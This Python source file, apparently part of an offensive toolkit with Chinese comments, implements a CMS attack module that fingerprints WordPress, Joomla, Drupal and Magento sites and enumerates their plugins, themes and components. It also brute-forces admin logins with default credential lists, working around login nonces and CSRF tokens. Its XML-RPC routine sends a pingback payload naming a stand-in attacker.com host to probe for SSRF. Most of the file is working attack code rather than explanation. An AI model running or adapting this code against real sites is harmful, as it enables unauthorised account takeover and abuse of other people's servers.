# [file name]: attack_modules/cms_attacks.py
# !/usr/bin/env python3
"""
🎯 CMS攻击模块 - 针对WordPress, Joomla, Drupal等CMS的专项攻击
"""

import requests
import re
import json
import time
from urllib.parse import urljoin, urlparse
from typing import Dict, List, Optional, Tuple
import logging

logger = logging.getLogger(__name__)


class CMSAttacker:
    """CMS攻击模块"""

    def __init__(self, config: Dict):
        self.config = config.get('modules', {}).get('cms_attacks', {})
        self.timeout = config.get('scan', {}).get('timeout', 15)

        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })

        self.cms_signatures = self.load_cms_signatures()

    def load_cms_signatures(self) -> Dict:
        """加载CMS特征库"""
        return {
            'wordpress': {
                'paths': ['/wp-admin', '/wp-login.php', '/wp-content', '/xmlrpc.php'],
                'files': ['/wp-config.php', '/wp-settings.php'],
                'headers': ['X-Powered-By: PHP', 'X-Pingback:'],
                'content_patterns': ['wp-content', 'wp-includes', 'WordPress']
            },
            'joomla': {
                'paths': ['/administrator', '/components', '/modules'],
                'files': ['/configuration.php', '/joomla.xml'],
                'headers': ['X-Content-Encoded-By: Joomla'],
                'content_patterns': ['joomla', 'Joomla!', 'com_']
            },
            'drupal': {
                'paths': ['/user', '/admin', '/sites/all'],
                'files': ['/sites/default/settings.php'],
                'headers': ['X-Generator: Drupal'],
                'content_patterns': ['Drupal', 'drupal.js', 'sites/all']
            },
            'magento': {
                'paths': ['/admin', '/magento_version', '/js/mage'],
                'files': ['/app/etc/local.xml'],
                'headers': [],
                'content_patterns': ['Magento', 'mage/cookies.js']
            }
        }

    def detect_cms(self, target: str) -> Optional[str]:
        """检测目标使用的CMS"""
        try:
            response = self.session.get(target, timeout=10, verify=False)
            content = response.text.lower()
            headers = str(response.headers).lower()

            for cms, signatures in self.cms_signatures.items():
                # 检查路径
                for path in signatures['paths']:
                    if path in target.lower():
                        return cms

                # 检查内容模式
                for pattern in signatures['content_patterns']:
                    if pattern.lower() in content:
                        return cms

                # 检查头部
                for header in signatures['headers']:
                    if header.lower() in headers:
                        return cms

            return None

        except Exception as e:
            logger.error(f"CMS检测失败: {e}")
            return None

    def attack_wordpress(self, target: str) -> List[Dict]:
        """攻击WordPress网站"""
        results = []

        print("    🎯 开始WordPress专项攻击...")

        # 1. 版本探测
        version = self.detect_wordpress_version(target)
        if version:
            results.append({
                'type': 'wordpress_version',
                'severity': 'info',
                'description': f'WordPress版本: {version}',
                'version': version
            })

        # 2. 插件漏洞扫描
        plugin_vulns = self.scan_wordpress_plugins(target)
        results.extend(plugin_vulns)

        # 3. 主题漏洞扫描
        theme_vulns = self.scan_wordpress_themes(target)
        results.extend(theme_vulns)

        # 4. 暴力破解登录
        login_attack = self.brute_force_wordpress_login(target)
        results.extend(login_attack)

        # 5. XML-RPC攻击
        xmlrpc_attack = self.attack_wordpress_xmlrpc(target)
        results.extend(xmlrpc_attack)

        return results

    def detect_wordpress_version(self, target: str) -> Optional[str]:
        """检测WordPress版本"""
        try:
            # 检查readme.html
            readme_url = urljoin(target, '/readme.html')
            response = self.session.get(readme_url, timeout=5, verify=False)

            if response.status_code == 200:
                version_match = re.search(r'Version\s*([\d.]+)', response.text, re.I)
                if version_match:
                    return version_match.group(1)

            # 检查页面meta
            response = self.session.get(target, timeout=5, verify=False)
            meta_match = re.search(r'content="WordPress\s*([\d.]+)"', response.text, re.I)
            if meta_match:
                return meta_match.group(1)

            # 检查feed
            feed_url = urljoin(target, '/feed/')
            response = self.session.get(feed_url, timeout=5, verify=False)
            if response.status_code == 200:
                version_match = re.search(r'<generator>https://wordpress.org/\?v=([\d.]+)</generator>', response.text)
                if version_match:
                    return version_match.group(1)

            return None

        except:
            return None

    def scan_wordpress_plugins(self, target: str) -> List[Dict]:
        """扫描WordPress插件漏洞"""
        vulns = []

        # 常见插件路径
        common_plugins = [
            'akismet', 'contact-form-7', 'yoast-seo', 'woocommerce',
            'elementor', 'jetpack', 'all-in-one-seo-pack'
        ]

        for plugin in common_plugins[:5]:  # 扫描前5个
            plugin_url = urljoin(target, f'/wp-content/plugins/{plugin}/')

            try:
                response = self.session.get(plugin_url, timeout=5, verify=False)

                if response.status_code == 200:
                    # 检查是否存在已知漏洞文件
                    vuln_files = ['readme.txt', 'changelog.txt', 'README.md']
                    for file in vuln_files:
                        file_url = urljoin(plugin_url, file)
                        file_response = self.session.get(file_url, timeout=5, verify=False)

                        if file_response.status_code == 200:
                            # 检查版本信息
                            version_match = re.search(r'version\s*[:=]?\s*([\d.]+)',
                                                      file_response.text, re.I)
                            if version_match:
                                vulns.append({
                                    'type': 'wordpress_plugin_detected',
                                    'severity': 'low',
                                    'description': f'检测到插件: {plugin} 版本: {version_match.group(1)}',
                                    'plugin': plugin,
                                    'version': version_match.group(1),
                                    'url': plugin_url
                                })
                                break

            except:
                continue

        return vulns

    def scan_wordpress_themes(self, target: str) -> List[Dict]:
        """扫描WordPress主题漏洞"""
        vulns = []

        # 获取当前主题信息
        try:
            response = self.session.get(target, timeout=5, verify=False)

            # 从HTML中提取主题信息
            theme_match = re.search(r'/wp-content/themes/([^/]+)/', response.text)
            if theme_match:
                theme = theme_match.group(1)

                theme_url = urljoin(target, f'/wp-content/themes/{theme}/style.css')
                theme_response = self.session.get(theme_url, timeout=5, verify=False)

                if theme_response.status_code == 200:
                    # 从CSS头部提取版本信息
                    version_match = re.search(r'Version:\s*([\d.]+)', theme_response.text)
                    if version_match:
                        vulns.append({
                            'type': 'wordpress_theme_detected',
                            'severity': 'low',
                            'description': f'检测到主题: {theme} 版本: {version_match.group(1)}',
                            'theme': theme,
                            'version': version_match.group(1),
                            'url': theme_url
                        })

        except:
            pass

        return vulns

    def brute_force_wordpress_login(self, target: str) -> List[Dict]:
        """暴力破解WordPress登录"""
        results = []

        login_url = urljoin(target, '/wp-login.php')

        if not self.check_url_exists(login_url):
            return results

        print("      尝试WordPress登录爆破...")

        # WordPress特定凭证
        wp_credentials = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', '123456'),
            ('admin', 'admin123'),
            ('wpadmin', 'wpadmin'),
            ('wordpress', 'wordpress'),
            ('administrator', 'admin'),
            ('administrator', 'password')
        ]

        for username, password in wp_credentials:
            try:
                # 先获取页面和nonce
                session = requests.Session()
                response = session.get(login_url, timeout=5, verify=False)

                # 提取登录nonce
                nonce_match = re.search(r'name="_wpnonce" value="([^"]+)"', response.text)
                redirect_to_match = re.search(r'name="redirect_to" value="([^"]+)"', response.text)

                # 准备登录数据
                login_data = {
                    'log': username,
                    'pwd': password,
                    'wp-submit': '登录',
                    'testcookie': '1'
                }

                if nonce_match:
                    login_data['_wpnonce'] = nonce_match.group(1)
                if redirect_to_match:
                    login_data['redirect_to'] = redirect_to_match.group(1)

                # 提交登录
                login_response = session.post(
                    login_url,
                    data=login_data,
                    timeout=5,
                    verify=False,
                    allow_redirects=True
                )

                # 检查是否登录成功
                if 'dashboard' in login_response.url or 'wp-admin' in login_response.url:
                    results.append({
                        'type': 'wordpress_login_success',
                        'severity': 'high',
                        'description': f'WordPress登录成功: {username}:{password}',
                        'username': username,
                        'password': password,
                        'url': login_url
                    })
                    print(f"        🎉 发现凭证: {username}:{password}")
                    break

            except:
                continue

        return results

    def attack_wordpress_xmlrpc(self, target: str) -> List[Dict]:
        """攻击WordPress XML-RPC接口"""
        results = []

        xmlrpc_url = urljoin(target, '/xmlrpc.php')

        if not self.check_url_exists(xmlrpc_url):
            return results

        print("      测试XML-RPC接口...")

        try:
            # 测试XML-RPC是否可用
            response = self.session.get(xmlrpc_url, timeout=5, verify=False)

            if 'XML-RPC' in response.text:
                # 尝试pingback攻击
                pingback_payload = '''<?xml version="1.0" encoding="utf-8"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://attacker.com</string></value></param>
<param><value><string>http://target.com</string></value></param>
</params>
</methodCall>'''

                headers = {'Content-Type': 'text/xml'}
                pingback_response = self.session.post(
                    xmlrpc_url,
                    data=pingback_payload,
                    headers=headers,
                    timeout=5,
                    verify=False
                )

                if 'faultCode' not in pingback_response.text:
                    results.append({
                        'type': 'wordpress_xmlrpc_enabled',
                        'severity': 'medium',
                        'description': 'XML-RPC接口启用，可能存在SSRF风险',
                        'url': xmlrpc_url
                    })

        except:
            pass

        return results

    def attack_joomla(self, target: str) -> List[Dict]:
        """攻击Joomla网站"""
        results = []

        print("    🎯 开始Joomla专项攻击...")

        # 1. 版本探测
        version = self.detect_joomla_version(target)
        if version:
            results.append({
                'type': 'joomla_version',
                'severity': 'info',
                'description': f'Joomla版本: {version}',
                'version': version
            })

        # 2. 组件漏洞扫描
        component_vulns = self.scan_joomla_components(target)
        results.extend(component_vulns)

        # 3. 暴力破解登录
        login_attack = self.brute_force_joomla_login(target)
        results.extend(login_attack)

        return results

    def detect_joomla_version(self, target: str) -> Optional[str]:
        """检测Joomla版本"""
        try:
            # 检查管理员页面
            admin_url = urljoin(target, '/administrator/manifests/files/joomla.xml')
            response = self.session.get(admin_url, timeout=5, verify=False)

            if response.status_code == 200:
                version_match = re.search(r'<version>([\d.]+)</version>', response.text)
                if version_match:
                    return version_match.group(1)

            # 检查robots.txt
            robots_url = urljoin(target, '/robots.txt')
            response = self.session.get(robots_url, timeout=5, verify=False)

            if response.status_code == 200:
                version_match = re.search(r'Joomla! ([\d.]+)', response.text)
                if version_match:
                    return version_match.group(1)

            return None

        except:
            return None

    def scan_joomla_components(self, target: str) -> List[Dict]:
        """扫描Joomla组件"""
        vulns = []

        # 常见组件路径
        common_components = [
            'com_content', 'com_users', 'com_contact',
            'com_banners', 'com_search', 'com_newsfeeds'
        ]

        for component in common_components:
            component_url = urljoin(target, f'/components/{component}/')

            try:
                response = self.session.get(component_url, timeout=5, verify=False)

                if response.status_code == 200:
                    vulns.append({
                        'type': 'joomla_component_detected',
                        'severity': 'low',
                        'description': f'检测到Joomla组件: {component}',
                        'component': component,
                        'url': component_url
                    })

            except:
                continue

        return vulns

    def brute_force_joomla_login(self, target: str) -> List[Dict]:
        """暴力破解Joomla登录"""
        results = []

        login_url = urljoin(target, '/administrator/index.php')

        if not self.check_url_exists(login_url):
            return results

        print("      尝试Joomla登录爆破...")

        # Joomla特定凭证
        joomla_credentials = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', '123456'),
            ('administrator', 'administrator'),
            ('superuser', 'superuser'),
            ('manager', 'manager')
        ]

        for username, password in joomla_credentials:
            try:
                # 先获取登录页面
                session = requests.Session()
                response = session.get(login_url, timeout=5, verify=False)

                # 提取CSRF token
                token_match = re.search(r'name="([a-f0-9]{32})" value="1"', response.text)

                # 准备登录数据
                login_data = {
                    'username': username,
                    'passwd': password,
                    'option': 'com_login',
                    'task': 'login',
                    'return': 'aW5kZXgucGhw',
                    'lang': ''
                }

                if token_match:
                    token_name = token_match.group(1)
                    login_data[token_name] = '1'

                # 提交登录
                login_response = session.post(
                    login_url,
                    data=login_data,
                    timeout=5,
                    verify=False,
                    allow_redirects=True
                )

                # 检查是否登录成功
                if 'task=logout' in login_response.text or 'Welcome to' in login_response.text:
                    results.append({
                        'type': 'joomla_login_success',
                        'severity': 'high',
                        'description': f'Joomla登录成功: {username}:{password}',
                        'username': username,
                        'password': password,
                        'url': login_url
                    })
                    print(f"        🎉 发现凭证: {username}:{password}")
                    break

            except:
                continue

        return results

    def attack_drupal(self, target: str) -> List[Dict]:
        """攻击Drupal网站"""
        results = []

        print("    🎯 开始Drupal专项攻击...")

        # 1. 版本探测
        version = self.detect_drupal_version(target)
        if version:
            results.append({
                'type': 'drupal_version',
                'severity': 'info',
                'description': f'Drupal版本: {version}',
                'version': version
            })

        # 2. 模块漏洞扫描
        module_vulns = self.scan_drupal_modules(target)
        results.extend(module_vulns)

        # 3. 暴力破解登录
        login_attack = self.brute_force_drupal_login(target)
        results.extend(login_attack)

        return results

    def detect_drupal_version(self, target: str) -> Optional[str]:
        """检测Drupal版本"""
        try:
            # 检查CHANGELOG.txt
            changelog_url = urljoin(target, '/CHANGELOG.txt')
            response = self.session.get(changelog_url, timeout=5, verify=False)

            if response.status_code == 200:
                version_match = re.search(r'Drupal ([\d.]+)', response.text)
                if version_match:
                    return version_match.group(1)

            # 检查README.txt
            readme_url = urljoin(target, '/README.txt')
            response = self.session.get(readme_url, timeout=5, verify=False)

            if response.status_code == 200:
                version_match = re.search(r'DRUPAL.*?([\d.]+)', response.text, re.I)
                if version_match:
                    return version_match.group(1)

            return None

        except:
            return None

    def scan_drupal_modules(self, target: str) -> List[Dict]:
        """扫描Drupal模块"""
        vulns = []

        # 检查模块目录
        modules_url = urljoin(target, '/modules/')

        try:
            response = self.session.get(modules_url, timeout=5, verify=False)

            if response.status_code == 200:
                # 查找模块目录
                module_matches = re.findall(r'href="([^"/]+)/"', response.text)

                for module in module_matches[:10]:  # 只检查前10个
                    module_info_url = urljoin(modules_url, f'{module}/{module}.info')

                    module_response = self.session.get(module_info_url, timeout=3, verify=False)

                    if module_response.status_code == 200:
                        # 提取模块信息
                        name_match = re.search(r'name\s*=\s*([^\n]+)', module_response.text)
                        version_match = re.search(r'version\s*=\s*([^\n]+)', module_response.text)

                        vulns.append({
                            'type': 'drupal_module_detected',
                            'severity': 'low',
                            'description': f'检测到Drupal模块: {module}',
                            'module': module,
                            'name': name_match.group(1) if name_match else '未知',
                            'version': version_match.group(1) if version_match else '未知',
                            'url': modules_url
                        })

        except:
            pass

        return vulns

    def brute_force_drupal_login(self, target: str) -> List[Dict]:
        """暴力破解Drupal登录"""
        results = []

        login_url = urljoin(target, '/user/login')

        if not self.check_url_exists(login_url):
            return results

        print("      尝试Drupal登录爆破...")

        # Drupal特定凭证
        drupal_credentials = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', '123456'),
            ('administrator', 'admin'),
            ('user', 'user'),
            ('test', 'test')
        ]

        for username, password in drupal_credentials:
            try:
                # 先获取登录页面
                session = requests.Session()
                response = session.get(login_url, timeout=5, verify=False)

                # 提取form_build_id
                form_id_match = re.search(r'name="form_build_id" value="([^"]+)"', response.text)

                # 准备登录数据
                login_data = {
                    'name': username,
                    'pass': password,
                    'form_id': 'user_login_form',
                    'op': '登录'
                }

                if form_id_match:
                    login_data['form_build_id'] = form_id_match.group(1)

                # 提交登录
                login_response = session.post(
                    login_url,
                    data=login_data,
                    timeout=5,
                    verify=False,
                    allow_redirects=True
                )

                # 检查是否登录成功
                if 'Log out' in login_response.text or 'My account' in login_response.text:
                    results.append({
                        'type': 'drupal_login_success',
                        'severity': 'high',
                        'description': f'Drupal登录成功: {username}:{password}',
                        'username': username,
                        'password': password,
                        'url': login_url
                    })
                    print(f"        🎉 发现凭证: {username}:{password}")
                    break

            except:
                continue

        return results

    def execute_attack(self, target: str, cms_type: str = None) -> List[Dict]:
        """执行CMS攻击"""
        results = []

        # 如果没有指定CMS，先检测
        if not cms_type:
            cms_type = self.detect_cms(target)

        if not cms_type:
            print("    ⚠️  未检测到支持的CMS")
            return results

        print(f"    🎯 检测到 {cms_type.upper()}，开始专项攻击...")

        # 根据CMS类型执行相应的攻击
        if cms_type == 'wordpress':
            results = self.attack_wordpress(target)
        elif cms_type == 'joomla':
            results = self.attack_joomla(target)
        elif cms_type == 'drupal':
            results = self.attack_drupal(target)
        elif cms_type == 'magento':
            # 可以扩展Magento攻击
            results.append({
                'type': 'cms_detected',
                'severity': 'info',
                'description': f'检测到{cms_type}，当前版本暂不支持深度攻击',
                'cms': cms_type
            })
        else:
            results.append({
                'type': 'cms_detected',
                'severity': 'info',
                'description': f'检测到{cms_type}，当前版本暂不支持攻击',
                'cms': cms_type
            })

        return results

    def check_url_exists(self, url: str) -> bool:
        """检查URL是否存在"""
        try:
            response = self.session.head(url, timeout=5, verify=False, allow_redirects=True)
            return response.status_code in [200, 301, 302, 403]
        except:
            return False


# 测试函数
def test_cms_attacker():
    """测试CMS攻击模块"""
    print("=" * 60)
    print("🧪 CMS攻击模块测试")
    print("=" * 60)

    config = {
        'modules': {
            'cms_attacks': {
                'wordpress': {'enabled': True},
                'joomla': {'enabled': True},
                'drupal': {'enabled': True}
            }
        },
        'scan': {'timeout': 10}
    }

    attacker = CMSAttacker(config)

    # 测试CMS检测
    test_url = "http://example.com"
    cms_type = attacker.detect_cms(test_url)

    if cms_type:
        print(f"检测到CMS: {cms_type}")
    else:
        print("未检测到CMS")

    print("\n" + "=" * 60)


if __name__ == "__main__":
    test_cms_attacker()
